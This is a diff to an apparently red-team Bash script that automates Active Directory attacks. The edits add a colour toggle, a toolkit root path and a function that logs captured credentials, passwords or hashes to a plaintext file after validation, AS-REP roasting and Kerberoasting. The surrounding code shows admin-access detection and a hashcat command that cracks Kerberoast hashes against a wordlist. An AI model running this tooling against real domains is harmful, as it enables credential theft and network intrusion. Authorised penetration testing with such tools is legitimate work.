@@ -40,6 +40,11 @@ MAGENTA='\033[0;35m'
 BOLD='\033[1m'
 NC='\033[0m'
 
+disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
+[[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]] && disable_colors
+
+TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"
+
 ts()      { date '+%H:%M:%S'; }
 info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
 success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
@@ -49,6 +54,16 @@ phase()   { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }
 cmd_log() {
     echo -e "${CYAN}[$(ts)] [CMD]${NC} $*"
     echo "[$(date '+%Y-%m-%d %H:%M:%S')] CMD: $*" >> "${OUTDIR}/cmd_log.txt" 2>/dev/null || true
+}
+
+creds_log() {
+    local creds_file="${TOOLKIT_ROOT}/creds.txt"
+    mkdir -p "$(dirname "$creds_file")" 2>/dev/null || true
+    if ! printf '%s | %-8s | %-15s | %-20s | %s | %s\n' \
+        "$(date '+%Y-%m-%d %H:%M:%S')" "$1" "$2" "$3" "$4" "$5" >> "$creds_file" 2>/dev/null; then
+        warn "CRED NOT LOGGED — cannot write to ${creds_file}"
+        warn "Credential: $3@$2 : $4 ($5)"
+    fi
 }
 
 #------------------------------------------------------------------------------
@@ -341,6 +356,7 @@ phase1_domain_context() {
         return 1
     fi
     success "Credentials valid for ${USER}@${DOMAIN}"
+    creds_log "adr" "$DC_IP" "$USER" "${PASS:-${HASH:-unknown}}" "validated"
 
     if grep -qF 'Pwn3d!' "$ctx_out"; then
         success "*** ADMIN ACCESS (Pwn3d!) — ${USER} is local admin on DC ***"
@@ -579,6 +595,7 @@ phase3_kerberos() {
             asrep_count=$(grep -c '^\$krb5asrep' "$asrep_file" 2>/dev/null || echo 0)
             success "*** AS-REP ROASTABLE: ${asrep_count} account(s) → hashes/asreproast.txt ***"
             echo "ASREP_COUNT=${asrep_count}" >> "${OUTDIR}/summary_notes.txt"
+            creds_log "adr" "$DC_IP" "${asrep_count}_users" "see ${asrep_file}" "asrep"
 
             # Extract just the usernames; shellcheck disable=SC2016 (regex literal $)
             # shellcheck disable=SC2016
@@ -621,6 +638,7 @@ phase3_kerberos() {
             kerb_count=$(grep -c '^\$krb5tgs' "$kerb_file" 2>/dev/null || echo 0)
             success "*** KERBEROASTABLE: ${kerb_count} account(s) → hashes/kerberoast.txt ***"
             echo "KERB_COUNT=${kerb_count}" >> "${OUTDIR}/summary_notes.txt"
+            creds_log "adr" "$DC_IP" "${kerb_count}_users" "see ${kerb_file}" "kerberoast"
 
             attack_cmd "CRACK KERBEROAST HASHES (hashcat mode 13100)" \
                 "hashcat -m 13100 ${kerb_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" \
@@ -1278,6 +1296,7 @@ main() {
             --skip-shares)     SKIP_SHARES=true; shift ;;
             --quick)           QUICK_MODE=true; shift ;;
             --force)           FORCE_MODE=true; shift ;;
+            --no-color)        disable_colors; shift ;;
             -h|--help)         show_help; exit 0 ;;
             *)
                 error "Unknown option: $1"
@@ -1305,7 +1324,7 @@ main() {
     fi
 
     # Set defaults
-    [[ -z "$OUTDIR" ]] && OUTDIR="./ad/${DOMAIN}"
+    [[ -z "$OUTDIR" ]] && OUTDIR="${TOOLKIT_ROOT}/ad/${DOMAIN}"
     BASE_DN=$(domain_to_dn "$DOMAIN")
 
     # Create full output directory structure
